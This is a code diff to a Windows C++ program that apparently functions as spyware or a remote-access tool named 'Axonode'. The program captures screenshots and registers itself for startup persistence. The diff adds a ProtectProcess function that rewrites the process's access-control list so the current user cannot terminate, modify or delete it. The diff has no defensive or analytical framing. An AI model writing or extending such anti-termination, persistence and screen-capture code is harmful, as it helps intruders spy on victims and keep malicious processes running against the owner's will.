@@ -9,6 +9,8 @@
 #include <direct.h>
 #include <shlwapi.h>
 #include <VersionHelpers.h>
+#include <AccCtrl.h>
+#include <Aclapi.h>
 #pragma comment (lib, "shlwapi")
 
 #pragma region RetrieveOS
@@ -348,13 +350,13 @@ void getScreenShot()
 	if (PathIsDirectoryA(path.c_str()) != 0)
 	{
 		saveBMP(hBitmap, hDC, newChar);
-		std::cout << "\n [SCREENSHOT SAVED] \n";
+		std::cout << "\n[SCREENSHOT SAVED] \n";
 	}
 	else
 	{
 		_mkdir(path.c_str());
 		saveBMP(hBitmap, hDC, newChar);
-		std::cout << "\n [SCREENSHOT SAVED] \n";
+		std::cout << "\n[SCREENSHOT SAVED] \n";
 	}
 
 	SelectObject(hDC, old_obj);
@@ -451,6 +453,25 @@ void addStartup()
 
 	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
 	setStartup(L"Axonode", szPathToExe, NULL);
+}
+
+#pragma endregion
+
+#pragma region ProtectProcess
+
+const bool ProtectProcess()
+{
+	HANDLE hProc = GetCurrentProcess();
+	EXPLICIT_ACCESS dAccess = { 0 };
+	DWORD dwAPerm = GENERIC_WRITE | PROCESS_ALL_ACCESS | WRITE_DAC | DELETE | WRITE_OWNER | READ_CONTROL;
+	BuildExplicitAccessWithName(&dAccess, _T("CURRENT_USER"), dwAPerm, DENY_ACCESS, NO_INHERITANCE);
+	PACL pTempDacl = NULL;
+	DWORD dwErr = 0;
+	dwErr = SetEntriesInAcl(1, &dAccess, NULL, &pTempDacl);
+	dwErr = SetSecurityInfo(hProc, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pTempDacl, NULL);
+	LocalFree(pTempDacl);
+	CloseHandle(hProc);
+	return dwErr == ERROR_SUCCESS;
 }
 
 #pragma endregion
